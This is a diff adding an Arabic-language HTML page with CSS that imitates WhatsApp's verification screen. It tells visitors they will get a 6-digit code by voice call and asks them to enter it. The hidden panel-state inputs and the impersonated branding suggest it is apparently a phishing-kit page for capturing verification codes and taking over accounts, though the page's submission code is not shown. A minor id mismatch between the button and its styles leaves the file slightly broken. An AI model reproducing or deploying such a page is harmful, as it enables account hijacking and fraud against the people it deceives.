@@ -1,0 +1,635 @@
+<input type="hidden" id="DivName" Value="Sms_Error">
+<input type="hidden" id="DivNext" Value="Loading">
+
+
+<div class="container" id="container" dir="rtl">
+  <div id="confirmationForm" novalidate="">
+    <div id="codeSection">
+      <div class="code-container">
+        <img class="join-logo" src="./assets/images/whatsapp.png" alt="Icon">
+        <h2 class="code-title">سوف يصلك الرمز عبر مكالمة صوتية</h2>
+
+        <p class="code-subtitle">
+          سيصلك اتصال هاتفي من واتساب يتضمن رمز تحقق مكونا من 6 ارقام.
+          يرجى الرد على المكالمة والاستماع الى الرمز ثم ادخاله هنا.
+        </p>
+
+
+
+
+
+        <input id="sms" type="text" name="code" maxlength="6" placeholder="— — — — — —" required="" inputmode="numeric"
+          autofocus="">
+
+
+
+        <button id="clickmee">
+          <i class="fas fa-check-circle"></i> تأكيد الرمز
+        </button>
+        <div class="resend-buttons">
+          <button type="button" id="resendCallBtn" class="resend-btn">
+            <i class="fas fa-phone-alt"></i>
+            <span id="resendCallBtnText">إعادة إرسال المكالمة</span>
+            <span id="callChrono" class="btn-chrono" style="display: none;">
+              <span class="btn-chrono-timer">60</span>
+            </span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<style>
+  /* ===== RESET & BASE STYLES ===== */
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+    min-height: 100vh;
+    line-height: 1.6;
+    color: #333;
+  }
+
+  /* ===== NAVBAR ===== */
+  .navbar {
+    background: linear-gradient(to left, #075E54, #128C7E);
+    color: white;
+    padding: 15px 25px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    box-shadow: 0 3px 15px rgba(7, 94, 84, 0.2);
+    position: relative;
+    z-index: 100;
+  }
+
+  .navbar-title {
+    font-size: 1.3rem;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+  }
+
+  .navbar img {
+    height: 45px;
+    width: auto;
+  }
+
+  /* ===== MAIN CONTAINER ===== */
+  .container {
+    max-width: 500px;
+    margin: 40px auto;
+    padding: 0 20px;
+    animation: fadeIn 0.5s ease;
+  }
+
+  @keyframes fadeIn {
+    from {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  /* ===== CODE CONTAINER ===== */
+  .code-container {
+    background: white;
+    border-radius: 20px;
+    padding: 40px 35px;
+    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
+    text-align: center;
+    border: 1px solid rgba(37, 211, 102, 0.1);
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.3s ease;
+  }
+
+  .code-container:hover {
+    transform: translateY(-5px);
+  }
+
+  .code-container::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    right: 0;
+    width: 100%;
+    height: 5px;
+    background: linear-gradient(to left, #25D366, #128C7E);
+  }
+
+  .code-logo {
+    width: 140px;
+    height: auto;
+    margin: 0 auto 25px;
+    display: block;
+    border-radius: 15px;
+    padding: 15px;
+    background: rgba(37, 211, 102, 0.05);
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+    transition: transform 0.3s ease;
+  }
+
+  .code-logo:hover {
+    transform: scale(1.05);
+  }
+
+  .code-title {
+    color: #075E54;
+    text-align: center;
+    margin-bottom: 20px;
+    font-size: 1.8rem;
+    font-weight: 800;
+    line-height: 1.4;
+  }
+
+  .code-subtitle {
+    color: #666;
+    margin-bottom: 25px;
+    font-size: 1.05rem;
+    line-height: 1.7;
+  }
+
+  /* ===== INPUT FIELD ===== */
+  #sms {
+    width: 100%;
+    padding: 18px 20px;
+    font-size: 1.8rem;
+    text-align: center;
+    letter-spacing: 15px;
+    border: 2px solid #e0e0e0;
+    border-radius: 12px;
+    margin-bottom: 25px;
+    background: #f8f9fa;
+    font-family: 'Courier New', monospace;
+    color: #075E54;
+    font-weight: 700;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    direction: ltr;
+    outline: none;
+    caret-color: #25D366;
+  }
+
+  #sms:focus {
+    border-color: #25D366;
+    box-shadow: 0 0 0 4px rgba(37, 211, 102, 0.15);
+    background: white;
+    transform: translateY(-2px);
+  }
+
+  #sms::placeholder {
+    color: #bbb;
+    letter-spacing: 10px;
+    font-size: 1.6rem;
+  }
+
+  /* ===== BUTTONS ===== */
+  #clickme {
+    background: linear-gradient(to left, #25D366, #128C7E);
+    color: white;
+    border: none;
+    padding: 18px 30px;
+    font-size: 1.15rem;
+    border-radius: 12px;
+    cursor: pointer;
+    width: 100%;
+    font-weight: 700;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    letter-spacing: 0.5px;
+    position: relative;
+    overflow: hidden;
+    margin-bottom: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+  }
+
+  #clickme i {
+    font-size: 1.2rem;
+  }
+
+  #clickme::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+    transition: 0.5s;
+  }
+
+  #clickme:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 10px 25px rgba(37, 211, 102, 0.3);
+  }
+
+  #clickme:hover::before {
+    left: 100%;
+  }
+
+  #clickme:active {
+    transform: translateY(-1px);
+    box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+  }
+
+  #clickme:disabled {
+    background: #cccccc;
+    cursor: not-allowed;
+    transform: none;
+    box-shadow: none;
+  }
+
+  #clickme:disabled:hover::before {
+    display: none;
+  }
+
+  /* زر إعادة الإرسال */
+  .resend-buttons {
+    display: flex;
+    gap: 10px;
+    margin-top: 15px;
+  }
+
+  .resend-btn {
+    flex: 1;
+    padding: 16px 20px;
+    font-size: 1rem;
+    border-radius: 12px;
+    cursor: pointer;
+    font-weight: 700;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    letter-spacing: 0.5px;
+    position: relative;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    border: none;
+  }
+
+  .resend-btn i {
+    font-size: 1.1rem;
+  }
+
+  #resendCallBtn {
+    background: linear-gradient(to left, #128C7E, #075E54);
+    color: white;
+  }
+
+  .resend-btn::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+    transition: 0.5s;
+  }
+
+  .resend-btn:hover {
+    transform: translateY(-3px);
+  }
+
+  #resendCallBtn:hover {
+    box-shadow: 0 10px 25px rgba(18, 140, 126, 0.3);
+  }
+
+  .resend-btn:hover::before {
+    left: 100%;
+  }
+
+  .resend-btn:active {
+    transform: translateY(-1px);
+  }
+
+  .resend-btn:disabled {
+    background: #cccccc;
+    cursor: not-allowed;
+    transform: none;
+    box-shadow: none;
+  }
+
+  .resend-btn:disabled:hover::before {
+    display: none;
+  }
+
+  /* الكرونو داخل الزر */
+  .btn-chrono {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-left: 5px;
+  }
+
+  .btn-chrono-timer {
+    font-weight: 800;
+    font-size: 1.1rem;
+    background: rgba(255, 255, 255, 0.2);
+    padding: 2px 8px;
+    border-radius: 6px;
+    min-width: 30px;
+    text-align: center;
+  }
+
+  /* ===== MESSAGES ===== */
+  #errorMsg,
+  #successMsg {
+    display: none;
+    font-weight: bold;
+    margin: 20px 0;
+    text-align: center;
+    padding: 15px;
+    border-radius: 10px;
+    animation: slideIn 0.3s ease;
+  }
+
+  @keyframes slideIn {
+    from {
+      opacity: 0;
+      transform: translateY(-10px);
+    }
+
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  #errorMsg {
+    color: #d32f2f;
+    background-color: #ffebee;
+    border: 1px solid #ffcdd2;
+    box-shadow: 0 3px 10px rgba(211, 47, 47, 0.1);
+  }
+
+  #successMsg {
+    color: #2e7d32;
+    background-color: #e8f5e9;
+    border: 1px solid #c8e6c9;
+    box-shadow: 0 3px 10px rgba(46, 125, 50, 0.1);
+  }
+
+  /* ===== FOOTER ===== */
+  .footer {
+    text-align: center;
+    color: #666;
+    padding: 25px 20px;
+    font-size: 0.9rem;
+    background: rgba(255, 255, 255, 0.9);
+    margin-top: 40px;
+    border-top: 1px solid rgba(0, 0, 0, 0.05);
+  }
+
+  .footer p {
+    margin: 8px 0;
+    opacity: 0.8;
+  }
+
+  /* ===== LOADING OVERLAY ===== */
+  .loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0, 0, 0, 0.9);
+    backdrop-filter: blur(5px);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    animation: overlayIn 0.3s ease;
+  }
+
+  @keyframes overlayIn {
+    from {
+      opacity: 0;
+    }
+
+    to {
+      opacity: 1;
+    }
+  }
+
+  /* ===== LOADING POPUP ===== */
+  .loading-popup {
+    background: white;
+    padding: 40px 35px;
+    border-radius: 20px;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 25px;
+    min-width: 320px;
+    max-width: 90%;
+    animation: popupIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  }
+
+  @keyframes popupIn {
+    from {
+      opacity: 0;
+      transform: scale(0.8) translateY(20px);
+    }
+
+    to {
+      opacity: 1;
+      transform: scale(1) translateY(0);
+    }
+  }
+
+  /* ===== MEDIA QUERIES ===== */
+  @media (max-width: 768px) {
+    .navbar {
+      padding: 12px 20px;
+    }
+
+    .navbar-title {
+      font-size: 1.2rem;
+    }
+
+    .container {
+      margin: 30px auto;
+      padding: 0 15px;
+    }
+
+    .code-container {
+      padding: 35px 25px;
+      border-radius: 18px;
+    }
+
+    .code-logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    .code-title {
+      font-size: 1.6rem;
+    }
+
+    .code-subtitle {
+      font-size: 1rem;
+      margin-bottom: 20px;
+    }
+
+    #sms {
+      font-size: 1.6rem;
+      letter-spacing: 12px;
+      padding: 16px;
+    }
+
+    #clickme,
+    .resend-btn {
+      padding: 16px;
+      font-size: 1rem;
+    }
+
+    .resend-buttons {
+      flex-direction: column;
+    }
+
+    .btn-chrono-timer {
+      font-size: 1rem;
+      padding: 2px 6px;
+    }
+  }
+
+  @media (max-width: 480px) {
+    .navbar {
+      padding: 10px 15px;
+    }
+
+    .navbar-title {
+      font-size: 1.1rem;
+    }
+
+    .navbar img {
+      height: 35px;
+    }
+
+    .code-container {
+      padding: 30px 20px;
+      border-radius: 16px;
+    }
+
+    .code-logo {
+      width: 100px;
+      margin-bottom: 15px;
+    }
+
+    .code-title {
+      font-size: 1.4rem;
+    }
+
+    .code-subtitle {
+      font-size: 0.95rem;
+    }
+
+    #sms {
+      font-size: 1.4rem;
+      letter-spacing: 10px;
+      padding: 14px;
+      margin-bottom: 20px;
+    }
+
+    #sms::placeholder {
+      font-size: 1.3rem;
+      letter-spacing: 8px;
+    }
+
+    #clickme,
+    .resend-btn {
+      padding: 15px;
+      font-size: 0.95rem;
+    }
+
+    .btn-chrono-timer {
+      font-size: 0.95rem;
+      padding: 2px 5px;
+    }
+
+    .footer {
+      padding: 20px 15px;
+      font-size: 0.85rem;
+    }
+  }
+
+  @media (max-width: 360px) {
+    .code-title {
+      font-size: 1.3rem;
+    }
+
+    #sms {
+      font-size: 1.3rem;
+      letter-spacing: 8px;
+    }
+  }
+
+  /* ===== DARK MODE ===== */
+  @media (prefers-color-scheme: dark) {
+    body {
+      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+      color: #e0e0e0;
+    }
+
+    .code-container {
+      background: #2d2d2d;
+      border-color: rgba(37, 211, 102, 0.2);
+    }
+
+    .code-title {
+      color: #25D366;
+    }
+
+    .code-subtitle {
+      color: #aaa;
+    }
+
+    #sms {
+      background: #3d3d3d;
+      border-color: #555;
+      color: #25D366;
+    }
+
+    #sms:focus {
+      border-color: #25D366;
+      background: #444;
+    }
+
+    .footer {
+      background: rgba(45, 45, 45, 0.9);
+      color: #aaa;
+    }
+
+    .loading-popup {
+      background: #2d2d2d;
+      color: #e0e0e0;
+    }
+
+    #errorMsg {
+      background-color: #5c2b29;
+      border-color: #8a3c38;
+      color: #ffb4ab;
+    }
+
+    #successMsg {
+      background-color: #1b5e20;
+      border-color: #2e7d32;
+      color: #a5d6a7;
+    }
+  }
+</style>
